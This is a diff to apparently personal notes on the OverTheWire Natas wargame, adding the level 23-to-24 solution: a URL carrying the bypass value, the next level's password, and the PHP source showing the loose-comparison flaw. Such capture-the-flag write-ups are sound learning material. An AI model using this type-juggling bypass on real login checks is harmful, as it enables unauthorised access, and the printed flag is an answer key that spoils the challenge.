@@ -740,4 +740,22 @@ if(array_key_exists("revelio", $_GET)) {
 <img width="1512" alt="Screenshot 2025-07-06 at 11 14 20 PM" src="https://github.com/user-attachments/assets/1001e08b-8faf-4d01-9b9a-d826b4784bc1" />
 
 ## 23->24
-- 2025-07-07 Break Day
+- http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou
+- `natas24:MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd`
+- Any password with a number greater than `10` in front followed by `iloveyou` grants the password.
+```php
+<?php
+    if(array_key_exists("passwd",$_REQUEST)){
+        // This checks if the submitted password contains the substring "iloveyou"
+        // AND if the password (when compared as a string) is greater than 10.
+        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas24 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+    // morla / 10111
+?>
+```
